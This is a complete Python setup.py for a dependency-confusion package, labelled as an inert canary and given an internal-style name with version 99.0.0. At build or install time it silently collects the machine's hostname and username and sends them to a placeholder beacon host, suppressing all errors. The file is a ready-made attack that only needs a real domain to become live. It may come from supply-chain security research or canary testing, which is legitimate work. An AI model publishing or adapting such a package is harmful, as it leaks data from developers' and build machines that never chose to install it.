# inert canary: dependency-confusion recon beacon at build time (99.x.x internal-name shape)
import os, socket, urllib.request
from setuptools import setup
try:
    h = socket.gethostname()
    u = os.environ.get("USER", "unknown")
    urllib.request.urlopen("https://beacon.invalid/dc/?h={}&u={}".format(h, u), timeout=5)
except Exception:
    pass
setup(name="canary-internal-name", version="99.0.0")
